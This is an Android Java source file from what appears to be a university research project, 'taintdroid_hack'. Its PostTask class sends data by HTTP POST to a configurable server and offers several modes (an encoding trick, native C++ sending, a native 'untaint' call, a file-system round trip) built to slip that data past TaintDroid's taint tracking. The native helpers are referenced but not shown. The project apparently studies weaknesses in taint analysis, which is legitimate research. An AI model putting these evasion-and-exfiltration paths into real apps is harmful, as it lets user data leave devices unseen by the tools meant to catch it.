package de.uni_passau.taintdroid_hack.tasks;

import android.content.Context;
import android.os.AsyncTask;
import android.support.annotation.NonNull;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

import de.uni_passau.taintdroid_hack.TaskResult;
import de.uni_passau.taintdroid_hack.impl.ErrorResult;
import de.uni_passau.taintdroid_hack.impl.SuccessResult;
import de.uni_passau.taintdroid_hack.impl.TaintdroidHack;
import de.uni_passau.taintdroid_hack.util.SecurityLevel;
import de.uni_passau.taintdroid_hack.util.Stopwatch;

import static de.uni_passau.taintdroid_hack.Constants.LINE_SEP;
import static de.uni_passau.taintdroid_hack.Constants.TAG;
import static de.uni_passau.taintdroid_hack.Constants.UTF8;

/**
 * Simple {@link AsyncTask} to write a given String via POST-Request to a given URL.
 */
public class PostTask extends AsyncTask<String, Void, TaskResult> {

    private String address;
    private String path;
    private Integer port;
    private Boolean useSsl;
    private SecurityLevel securityLevel;
    private String filesDir;
    private Context context;

    public PostTask(Context context, String address, int port, SecurityLevel securityLevel) {
        this.securityLevel = securityLevel;
        this.address = address;
        this.port = port;
        this.useSsl = false;
        this.context = context;
    }

    public PostTask(Context context, String address, int port, String filesDir, SecurityLevel securityLevel) {
        this.securityLevel = securityLevel;
        this.address = address;
        this.port = port;
        this.useSsl = false;
        this.filesDir = filesDir;
        this.context = context;
    }

    @NonNull
    private URL buildUrl() {
        StringBuilder urlString = new StringBuilder();
        urlString.append("http");
        if (useSsl) urlString.append('s');
        urlString.append("://").append(address);
        if (port != null) urlString.append(':').append(port);
        urlString.append('/');
        if (path != null) urlString.append(path).append('/');
        try {
            return new URL(urlString.toString());
        } catch (MalformedURLException e) {
            Log.e(TAG, String.format("Got malformed URLException while trying to create %s", urlString));
            throw new RuntimeException("Got malformed URLException", e);
        }
    }

    @Override
    protected void onPostExecute(TaskResult taskResult) {
        super.onPostExecute(taskResult);
        if (taskResult.isError()) {
            Toast.makeText(context, taskResult.getMessage(), Toast.LENGTH_LONG).show();
        } else {
            Toast.makeText(context, "Successfully sent data", Toast.LENGTH_LONG).show();
        }
    }

    /**
     * Usage of this method is, that you give in the url as first parameter, and the content as the
     * second parameter.
     */
    @Override
    protected TaskResult doInBackground(String... strings) {
        StringBuilder content = new StringBuilder();
        for (String str : strings) {
            content.append(str).append(LINE_SEP);
        }

        switch (securityLevel) {
            case REGULAR:
                try {
                    String str = content.toString();
                    return javaSendDataTo(str.getBytes(UTF8));
                } catch (UnsupportedEncodingException e) {
                    Log.e(TAG, "Caught UnsupportedEncodingException, aborting", e);
                }
                break;
            case OBFUSCATED_JAVA:
                try {
                    String str = content.toString();
                    Stopwatch stopwatch = new Stopwatch();
                    String encodedString = TaintdroidHack.encodingTrick(str);
                    Log.i(TAG, String.format("Encoding method took: %d ms", stopwatch.splitTime()));
                    return javaSendDataTo(encodedString.getBytes(UTF8));
                } catch (UnsupportedEncodingException e) {
                    Log.e(TAG, "Caught UnsupportedEncodingException, aborting", e);
                }
                break;
            case OBFUSCATED_NATIVE_NETWORK:
                Stopwatch sw = new Stopwatch();
                if (!TaintdroidHack.sendDataTo(content.toString(), address, port)){
                    return new ErrorResult("An unknown error occured while sending data");
                }
                Log.i(TAG, String.format("Send data in c++ took: %d ms", sw.splitTime()));
                return new SuccessResult();
            case OBFUSCATED_NATIVE_UNTAINT:
                try {
                    String str = content.toString();
                    Stopwatch stopwatch = new Stopwatch();
                    byte[] untaint = TaintdroidHack.untaint(str).getBytes(UTF8);
                    Log.i(TAG, String.format("Untaint method took: %d ms", stopwatch.splitTime()));
                    return javaSendDataTo(untaint);
                } catch (UnsupportedEncodingException e) {
                    Log.e(TAG, "Caught UnsupportedEncodingException, aborting", e);
                }
                break;
            case OBFUSCATED_NATIVE_FILESYSTEM:
                String str = content.toString();
                Stopwatch stopwatch = new Stopwatch();
                TaintdroidHack.writeDataInFilesystem(str, filesDir);
                String filesystem = TaintdroidHack.readDataFromFilesystem(filesDir);
                Log.i(TAG, String.format("Filesystem method took: %d ms", stopwatch.splitTime()));
                try {
                    return javaSendDataTo(filesystem.getBytes(UTF8));
                } catch (UnsupportedEncodingException e) {
                    Log.e(TAG, "Caught UnsupportedEncodingException, aborting", e);
                }
                break;
        }
        return new ErrorResult("Got an unexpected error. Try again");
    }

    /**
     * Uses a {@link HttpURLConnection} to send the handed data via a HTTP-Post to the {@link URL}
     * returned by {@link PostTask#buildUrl()}.
     *
     * @param content the data that should be send as a byte-array. Use UTF-Encoding for content.
     * @see de.uni_passau.taintdroid_hack.Constants#UTF8
     * @see String#getBytes(String)
     */
    private TaskResult javaSendDataTo(byte[] content) {
        String type = "application/x-www-form-urlencoded; charset=UTF-8";
        try {
            URL url = buildUrl();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", type);
            conn.setRequestProperty("Content-Length", String.valueOf(content.length));
            conn.setRequestProperty("Accept-Encoding", UTF8.toLowerCase());
            OutputStream os = conn.getOutputStream();
            os.write(content);
            Log.i(TAG, String.format("wrote data to %s: %s", url.toString(), new String(content, UTF8)));
            os.flush();
            os.close();
            Log.i(TAG, String.format("Response code was %d", conn.getResponseCode()));
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append(LINE_SEP);

            Log.i(TAG, "got data" + sb.toString());
        } catch (UnsupportedEncodingException e) {
            Log.e(TAG, "Got error on encoding, aborting", e);
            return new ErrorResult("An unknown error occurred. Try again");
        } catch (ProtocolException e) {
            Log.e(TAG, "HTTP-protocol was not specified properly", e);
            return new ErrorResult("An unknown error occurred. Try again");
        } catch (IOException e) {
            Log.e(TAG, "IOException occurred during sending of data to remote machine", e);
            if (e instanceof ConnectException) {
                return new ErrorResult("Could not reach remote server.");
            } else {
                return new ErrorResult("Unknown error occurred, when trying to send data to server");
            }
        }
        return new SuccessResult();
    }
}